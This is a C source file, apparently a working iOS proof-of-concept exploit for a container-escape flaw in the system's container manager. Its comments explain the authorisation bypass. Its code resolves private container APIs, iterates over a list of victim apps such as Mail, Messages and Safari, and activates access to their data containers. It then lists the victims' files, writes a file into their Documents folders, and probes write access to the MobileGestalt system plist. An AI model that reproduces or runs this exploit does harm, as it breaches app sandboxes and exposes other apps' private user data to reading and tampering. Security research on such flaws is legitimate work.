/* MobileHouseArrest container escape (CVE-2026-43689, CWE-862).
 *
 * The containermanagerd authorises the caller by the CodeDirectory
 * identifier, and the authorisation key is the string
 * "com.apple.mobile.MobileHouseArrest" - the entitlement name, not a
 * bundle id. With an ad-hoc signature the identifier is arbitrary, so an
 * app that signs itself with that identifier is treated as the house
 * arrest client and is allowed to vend ANY app container.
 *
 * The whole client lives in libsystem_containermanager.dylib, which is
 * inside the app sandbox - no kernel bug, no pointer, no leak:
 *
 *   query_set_class(q, 2)                     app-data container
 *   query_set_ids(q, "<victim bundle id>")    the victim
 *   query_set_flags(q, 0x900000000)           read+write
 *   query_set_part(q, 0)                      the part domain
 *   obj   = container_query_get_single_result(q)
 *   path  = container_object_get_path(obj)
 *   token = container_copy_sandbox_token(obj)
 *   container_object_sandbox_extension_activate(obj, false)  -> access
 *
 * The class-13 variant asks for the MobileGestalt system group
 * (flags 0x8100000000, part 3 = Library/Caches) - read/write of the live
 * MobileGestalt plist.
 */
#include "exploit.h"
#include "nk_trace.h"
#include <dlfcn.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <errno.h>
#include <CoreFoundation/CoreFoundation.h>

/* xpc: the Theos SDK has no xpc/ headers, so the two calls we need are
 * declared by hand (libxpc is in libSystem). */
typedef struct xpc_object_s *xpc_object_t;
extern xpc_object_t xpc_string_create(const char *s);
extern void xpc_release(xpc_object_t o);

typedef void *container_query_t;
typedef void *container_object_t;

static const char *k_victims[] = {
    "com.apple.mobile.MobileHouseArrest",   // our own identifier: the
                                             // container of the app that
                                             // is definitely installed
    "com.dj.srk801",
    "com.apple.mobilenotes",
    "com.apple.mobilesafari",
    "com.apple.Preferences",
    "com.apple.mobileslack",
    "com.apple.mobiletimer",
    "com.apple.PassbookUIService",
    "com.apple.mobilephone",
    "com.apple.videos",
    "com.apple.Music",
    "com.apple.mobilemaps",
    "com.apple.mobilemail",
    "com.apple.MobileSMS",
    "com.apple.reminders",
    "com.apple.mobilesafari",
    "com.apple.shortcuts",
    "com.apple.mobilenotes",
    NULL
};

static int can_open(const char *path, int flags)
{
    int fd = open(path, flags | O_CLOEXEC);
    if (fd < 0) return 0;
    close(fd);
    return 1;
}


/* Enumerate the MCM client library's exports.
 *
 * The library lives in the dyld shared cache, so it is not on disk and its
 * symbol table cannot be read with a file parser. But the image is loaded
 * into our process, so we can find it through the dyld image list and
 * parse its LC_SYMTAB directly. That gives us the whole API surface -
 * every container_* entry point - instead of guessing which ones exist.
 */
#include <mach-o/dyld.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>

static int mha_dump_mcm_exports(void)
{
    uint32_t cnt = _dyld_image_count();
    for (uint32_t i = 0; i < cnt; i++) {
        const char *name = _dyld_get_image_name(i);
        if (!name || !strstr(name, "ontainermanager")) continue;
        nk_log("[MHA] MCM image: %s", name);
        const struct mach_header *mh = _dyld_get_image_header(i);
        if (!mh) continue;
        /* load commands have DIFFERENT sizes - stepping by
         * sizeof(segment_command_64) walks off the end of the list, which
         * is why the export dump came back empty. */
        uint32_t off = (uint32_t)sizeof(struct mach_header_64);
        for (uint32_t s = 0; s < mh->ncmds; s++) {
            struct load_command *lc = (struct load_command *)((uintptr_t)mh + off);
            if (lc->cmdsize == 0) break;
            off += lc->cmdsize;
            if (lc->cmd != LC_SYMTAB) continue;
            struct symtab_command *st = (struct symtab_command *)lc;
            struct nlist_64 *ns = (struct nlist_64 *)((uintptr_t)mh + st->symoff);
            uint32_t n = st->nsyms;
            for (uint32_t k = 0; k < n; k++) {
                if ((ns[k].n_type & N_TYPE) != N_SECT) continue;
                if ((ns[k].n_type & N_EXT) == 0) continue;
                const char *sname = (const char *)((uintptr_t)mh + st->stroff + ns[k].n_un.n_strx);
                if (strncmp(sname, "container_", 10) != 0) continue;
                nk_log("[MHA] export: %s", sname);
            }
        }
        return 1;
    }
    nk_log("[MHA] MCM image not found in the dyld list");
    return 0;
}

void nk_mha_attack(void)
{
    nk_doc_log_open("mha.log");
    nk_log("[MHA] === MobileHouseArrest container escape ===");
    mha_dump_mcm_exports();
    /* the identifier IS the authorisation key - it must be
     * "com.apple.mobile.MobileHouseArrest" for MCM to vend anything */
    {
        const char *me = getenv("MHA_IDENT");
        extern char **environ;
        (void)me; (void)environ;
    }
    {
        /* NSBundle's identifier, read via the CFBundle API */
        CFBundleRef b = CFBundleGetMainBundle();
        if (b) {
            CFStringRef id = CFBundleGetIdentifier(b);
            if (id) {
                char buf[256] = {0};
                if (CFStringGetCString(id, buf, sizeof(buf), kCFStringEncodingUTF8)) {
                    nk_log("[MHA] our bundle identifier = %s", buf);
                    nk_doc_log("mha.log", "[MHA] our bundle identifier = %s", buf);
                }
                CFRelease(id);
            }
        }
    }

    void *lib = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                       RTLD_NOW | RTLD_LOCAL);
    if (!lib) { nk_log("[MHA] dlopen failed: %s", dlerror()); return; }

    container_query_t (*q_create)(void) = dlsym(lib, "container_query_create");
    void (*q_class)(container_query_t, uint64_t) = dlsym(lib, "container_query_set_class");
    void (*q_ids)(container_query_t, xpc_object_t) = dlsym(lib, "container_query_set_identifiers");
    void (*q_gids)(container_query_t, xpc_object_t) = dlsym(lib, "container_query_set_group_identifiers");
    void (*q_flags)(container_query_t, uint64_t) = dlsym(lib, "container_query_operation_set_flags");
    void (*q_part)(container_query_t, uint64_t) = dlsym(lib, "container_query_operation_set_part");
    container_object_t (*q_result)(container_query_t) = dlsym(lib, "container_query_get_single_result");
    void (*q_free)(container_query_t) = dlsym(lib, "container_query_free");
    container_object_t (*o_copy)(container_object_t) = dlsym(lib, "container_object_copy");
    void (*o_free)(container_object_t) = dlsym(lib, "container_object_free");
    const char *(*o_path)(container_object_t) = dlsym(lib, "container_object_get_path");
    char *(*o_token)(container_object_t) = dlsym(lib, "container_copy_sandbox_token");
    int (*o_activate)(container_object_t, int) = dlsym(lib, "container_object_sandbox_extension_activate");

    if (!q_create || !q_class || !q_ids || !q_flags || !q_result || !q_free ||
        !o_copy || !o_free || !o_path || !o_token || !o_activate) {
        nk_log("[MHA] dlsym failed (missing symbols)");
        for (const char *n = "container_query_create\0container_query_set_class\0container_query_set_identifiers\0container_query_operation_set_flags\0container_query_get_single_result\0container_object_get_path\0container_copy_sandbox_token\0container_object_sandbox_extension_activate\0"; *n; n += strlen(n) + 1)
            if (!dlsym(lib, n)) nk_log("[MHA]   MISSING: %s", n);
        dlclose(lib);
        return;
    }
    nk_log("[MHA] all symbols resolved");
    /* the library is dlopen'd; list everything it exports so we can see
     * the full API instead of guessing names */
    {
        void *cur = (void *)0;
        /* iterate the dyld images again and dump every symbol of this one */
        uint32_t cnt = _dyld_image_count();
        for (uint32_t i = 0; i < cnt; i++) {
            const char *nm = _dyld_get_image_name(i);
            if (!nm || !strstr(nm, "ontainermanager")) continue;
            const struct mach_header *mh = _dyld_get_image_header(i);
            if (!mh) continue;
            uint32_t off2 = (uint32_t)sizeof(struct mach_header_64);
            for (uint32_t s = 0; s < mh->ncmds; s++) {
                struct load_command *lc = (struct load_command *)((uintptr_t)mh + off2);
                if (lc->cmdsize == 0) break;
                off2 += lc->cmdsize;
                if (lc->cmd != LC_SYMTAB) continue;
                struct symtab_command *st = (struct symtab_command *)lc;
                struct nlist_64 *ns = (struct nlist_64 *)((uintptr_t)mh + st->symoff);
                for (uint32_t k = 0; k < st->nsyms; k++) {
                    if ((ns[k].n_type & N_TYPE) != N_SECT) continue;
                    if ((ns[k].n_type & N_EXT) == 0) continue;
                    const char *sn = (const char *)((uintptr_t)mh + st->stroff + ns[k].n_un.n_strx);
                    if (strncmp(sn, "container_", 10) != 0) continue;
                    nk_log("[MHA] api: %s", sn);
                }
            }
        }
        (void)cur;
    }

    /* --- class 2: the container of another app ------------------------- */
    for (uint32_t v = 0; k_victims[v]; v++) {
        container_query_t q = q_create();
        if (!q) { nk_log("[MHA] query_create failed"); break; }
        q_class(q, 2);
        xpc_object_t id = xpc_string_create(k_victims[v]);
        q_ids(q, id);
        xpc_release(id);
        q_flags(q, 0x900000000ULL);
        if (q_part) q_part(q, 0);
        container_object_t borrowed = q_result(q);
        container_object_t obj = borrowed ? o_copy(borrowed) : NULL;
        if (!obj) {
            nk_log("[MHA] victim=%s -> NO RESULT (denied or not installed)", k_victims[v]);
            q_free(q);
            continue;
        }
        const char *p = o_path(obj);
        nk_log("[MHA] victim=%s -> path=%s", k_victims[v], p ? p : "(null)");
        char probe[512];
        if (p) {
            snprintf(probe, sizeof(probe), "%s/Documents", p);
            int before = can_open(probe, O_RDONLY);
            char *tok = o_token(obj);
            nk_log("[MHA]   token=%s", (tok && tok[0]) ? "present" : "none");
            free(tok);
            int act = o_activate(obj, 0);
            nk_log("[MHA]   activated=%d", act);
            int after = can_open(probe, O_RDONLY);
            nk_log("[MHA]   Documents readable before=%d after=%d", before, after);
            if (after && !before) {
                nk_log("[MHA] *** CONTAINER ESCAPE: %s is readable", probe);
                nk_doc_log("mha.log", "[MHA] *** CONTAINER ESCAPE: %s", probe);
                /* write a marker into the victim's Documents - proof of
                 * write access, and proof we can plant a file */
                {
                    char wf[600];
                    snprintf(wf, sizeof(wf), "%s/Documents/mha-escape-proof.txt", p);
                    FILE *f = fopen(wf, "w");
                    if (f) {
                        fprintf(f, "MobileHouseArrest PoC\ncontainer: %s\n", p);
                        fclose(f);
                        nk_log("[MHA] *** WROTE %s", wf);
                        nk_doc_log("mha.log", "[MHA] *** WROTE %s", wf);
                    } else {
                        nk_log("[MHA] write failed at %s (errno %d)", wf, errno);
                    }
                }
                /* list the victim's Documents */
                {
                    DIR *dp = opendir(probe);
                    if (dp) {
                        struct dirent *de;
                        while ((de = readdir(dp)) != NULL) {
                            if (de->d_name[0] == '.') continue;
                            nk_log("[MHA]     victim file: %s", de->d_name);
                        }
                        closedir(dp);
                    }
                }
            }
        }
        o_free(obj);
        q_free(q);
    }

    /* --- class 13: the MobileGestalt system group ---------------------- */
    if (q_gids) {
      for (uint32_t partv = 0; partv <= 3; partv += 3) {
        container_query_t q = q_create();
        q_class(q, 13);
        xpc_object_t g = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
        q_gids(q, g);
        xpc_release(g);
        q_flags(q, 0x8100000000ULL);
        if (q_part) q_part(q, partv);
        container_object_t borrowed = q_result(q);
        container_object_t obj = borrowed ? o_copy(borrowed) : NULL;
        if (!obj) {
            nk_log("[MHA] class13 -> NO RESULT");
        } else {
            const char *p = o_path(obj);
            nk_log("[MHA] class13 -> path=%s", p ? p : "(null)");
            if (p) {
                char pl[512];
                snprintf(pl, sizeof(pl), "%s/Library/Caches/com.apple.MobileGestalt.plist", p);
                int before = can_open(pl, O_RDWR);
                char *tok = o_token(obj);
                nk_log("[MHA]   token=%s", (tok && tok[0]) ? "present" : "none");
                free(tok);
                int act = o_activate(obj, 0);
                int after = can_open(pl, O_RDWR);
                nk_log("[MHA]   MG plist writable before=%d after=%d activated=%d", before, after, act);
                if (after && !before)
                    nk_log("[MHA] *** MOBILEGESTALT IS WRITABLE: %s", pl);
            }
            o_free(obj);
        }
        q_free(q);
      }
    }

    dlclose(lib);
    nk_log("[MHA] done");
}

/* Swift cannot call variadic C functions, so the identifier goes through a
 * plain wrapper. */
void nk_mha_log_ident(const char *ident)
{
    nk_doc_log_open("mha.log");
    nk_log("[MHA] IDENT = %s", ident ? ident : "?");
    nk_doc_log("mha.log", "[MHA] IDENT = %s", ident ? ident : "?");
}
